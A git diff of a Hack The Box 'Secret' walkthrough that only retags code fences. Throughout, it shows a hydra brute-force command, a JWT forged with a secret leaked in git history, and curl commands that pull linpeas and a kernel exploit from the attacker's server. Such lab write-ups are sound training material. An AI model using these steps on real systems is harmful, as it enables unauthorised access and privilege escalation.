@@ -3,7 +3,7 @@ This is a box that makes you learn a bit of json, git and make. Three things I d
 
 #Enumeration
 As always we start with a nmap scan.
-```
+```bash
 ┌──(kali㉿kali)-[~/Documents/HTB/secret]
 └─$ nmap -sC -sV 10.10.11.120
 Starting Nmap 7.92 ( https://nmap.org ) at 2022-02-24 13:46 EST
@@ -33,7 +33,7 @@ A quick google search doesn't really yeild any results surrounding what the Dumb
 
 The website is offering a guide on how to register users and what the different responses are. As you see in the picture, it mentions port 3000. This is really interesting. Therefore i direct my dirbscan towards the 3000 port to see if there is anything extra there.
 While it's scanning I'll check out the guide. It seems like if you want to register a user you use the following
-```
+```json
 POST http://localhost:3000/api/user/register 
  {
 	"name": "dasith",
@@ -42,14 +42,14 @@ POST http://localhost:3000/api/user/register
   }
 ```
 And the response would be:
-```
+```json
   {
 	"user": "dasith",
   }
 ```
 
 While a login would look like:
-```
+```json
 POST http://localhost:3000/api/user/login 
  {
 	"email": "root@dasith.works",
@@ -58,12 +58,12 @@ POST http://localhost:3000/api/user/login
    
 ```
 And would then return a auth-token.
-```
+```json
 eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MTE0NjU0ZDc3ZjlhNTRlMDBmMDU3NzciLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6InJvb3RAZGFzaXRoLndvcmtzIiwiaWF0IjoxNjI4NzI3NjY5fQ.PFJldSFVDrSoJ-Pg0HOxkGjxQ69gxVO2Kjn7ozw9Crg 
 ```
 If we pass that auth token to a [JWT decoder](https://jwt.io/), we would get the decoded values:
 
-```
+```json
 {
   "alg": "HS256",
   "typ": "JWT"
@@ -79,7 +79,7 @@ HMACSHA256(
 )
 ```
 And finally we could access the private route through the following request:
-```
+```json
 GET http://localhost:3000/api/priv 
 auth-token : eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MTE0NjU0ZDc3ZjlhNTRlMDBmMDU3NzciLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6InJvb3RAZGFzaXRoLndvcmtzIiwiaWF0IjoxNjI4NzI3NjY5fQ.PFJldSFVDrSoJ-Pg0HOxkGjxQ69gxVO2Kjn7ozw9Crg
 content-type: application.json
@@ -96,7 +96,7 @@ So with the general flow of the program in mind, we see that the user dasith is 
 Hydra is extreamly picky on the syntax, and now we are trying to bruteforce through a json application. Therefore a syntax like this would suffice to find the password:
 ` hydra -l root@dasith.works -P /usr/share/wordlists/rockyou.txt "http-post-form://10.10.11.120/api/user/login:{\"email\"\: \"root@dasith.works\",\"password\"\: \"^PASS^\"}:F=Password is|must be at least:H=Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8:H=Accept-Language: en-US,en;q=0.5:H=Accept-Encoding: gzip, deflate:H=Connection: close:H=Content-Type: application/json" -s 3000`
 The interaction would simply look like this:
-```
+```http
 POST /api/user/login HTTP/1.0
 Accept:  text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
 Accept-Language:  en-US,en;q=0.5
@@ -119,7 +119,7 @@ Connection: close
 Password is wrong
 ```
 This is the password the dasith user:
-```
+```bash
 Hydra v9.2 (c) 2021 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
 
 Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-02-24 16:29:27
@@ -133,7 +133,7 @@ But upon getting his auth-token and logging in to the /priv path, we get a messa
 
 #Further enumeration
 So after chasing a dead end, i check what dirb found. It found a page called download. It doesn't really give us anything. Therefore I will further fuzz the area to see if I can find a file here.
-```
+```bash
 ---- Scanning URL: http://10.10.11.120:3000/ ----
 + http://10.10.11.120:3000/api (CODE:200|SIZE:93)                                           
 + http://10.10.11.120:3000/assets (CODE:301|SIZE:179)
@@ -200,7 +200,7 @@ The check litterly doesn't care if we have the correct password or anything like
 
 # Checking the .git history
 So, there was a .git folder, and it seems like this was a program that was downloaded from github. Googling it doesn't yield any results, but if you use the command `git show`, you can see the different versions of the git repository you have cloned. So lets look there.
-```
+```bash
 0000000000000000000000000000000000000000 55fe756a29268f9b4e786ae468952ca4a8df1bd8 dasithsv <dasithsv@gmail.com> 1630648552 +0530        commit (initial): first commit
 55fe756a29268f9b4e786ae468952ca4a8df1bd8 3a367e735ee76569664bf7754eaaade7c735d702 dasithsv <dasithsv@gmail.com> 1630648599 +0530        commit: added downloads
 3a367e735ee76569664bf7754eaaade7c735d702 4e5547295cfe456d8ca7005cb823e1101fd1f9cb dasithsv <dasithsv@gmail.com> 1630648655 +0530        commit: removed swap
@@ -210,7 +210,7 @@ de0a46b5107a2f4d26e348303e76d85ae4870934 67d8da7a0e53d8fadeb6b36396d86cdcd4f6ec7
 ```
 Immedietly the version 67d8da7a0e53d8fadeb6b36396d86cdcd4f6ec78 looks interesting becuase it removed .ev for security reasons. If you remember, thats where we found the "secret" token password. So by viewing this we could see whats the security risk.
 
-```
+```bash
 ┌──(kali㉿kali)-[~/Documents/HTB/secret/local-web]
 └─$ git show 67d8da7a0e53d8fadeb6b36396d86cdcd4f6ec78
 commit 67d8da7a0e53d8fadeb6b36396d86cdcd4f6ec78
@@ -233,7 +233,7 @@ We have the secret token!
 Now we can craft our JWT and get a token where our name is theadmin.
 # Exploit
 So head over to the JWT online decoder and craft the token. The values I'm choosing are:
-```
+```json
 {
   "_id": "6205894901291c0464dfdf16",
   "name": "theadmin",
@@ -321,7 +321,7 @@ And we get shell!
 # Privesc
 So first i go to /dev/shm to get a clean slate that I can work from and not disturb anyone else. There i transfer [linpeas](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS) through the http server built into python. `python -m http.server`. And get my shell to get this with curl `curl http://10.10.14.231:8000/linpeas.sh -o linpeas.sh`.
 And run the script
-```
+```bash
 ╔══════════╣ Operative system                                                                                                                                                         
 ╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#kernel-exploits
 Linux version 5.4.0-89-generic (buildd@lgw01-amd64-044) (gcc version 9.3.0 (Ubuntu 9.3.0-17ubuntu1~20.04)) #100-Ubuntu SMP Fri Sep 24 14:50:10 UTC 2021
@@ -350,7 +350,7 @@ https://www.exploit-db.com/exploits/50689
 
 I prepare the files for transfer and transfer them with the python http server. Once the files are transferred, you simply have to run make and it will build the files for you and create a exploit program that will run the exploit.
 # Root
-```rootflag
+```bash
 ### On the host we are attacking
 $ curl http://10.10.14.231:8000/Makefile -o Makefile
   % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
